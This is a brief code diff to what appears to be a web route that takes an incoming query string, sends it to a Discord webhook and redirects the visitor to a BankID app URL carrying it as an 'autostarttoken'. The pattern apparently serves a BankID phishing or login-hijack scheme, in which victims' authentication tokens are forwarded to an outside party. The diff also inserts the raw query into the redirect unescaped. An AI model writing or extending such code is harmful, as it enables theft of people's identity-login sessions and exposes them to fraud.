@@ -18,20 +18,11 @@
     return res.status(400).send('Query parameters are required.');
   }
 
-  // Parse the query string
-  const parsedQuery = queryString.parse(queryString);
-
-  // Remove '=' from query parameters
-  const formattedParams = {};
-  for (let key in parsedQuery) {
-    formattedParams[key] = parsedQuery[key].replace('=', '');
-  }
-
-  // Log the formatted query string to console or webhook
+  // Log the query string to console or webhook
   sendDiscordWebhook(queryString);
 
-  // Construct the redirect URL with the formatted query parameters
-  const redirectUrl = `bankid:///?${queryString.stringify(formattedParams)}`;
+  // Construct the redirect URL with the extracted query parameters
+  const redirectUrl = `bankid:///?autostarttoken=${queryString}`;
 
   // Redirect to the constructed URL
   res.redirect(redirectUrl);
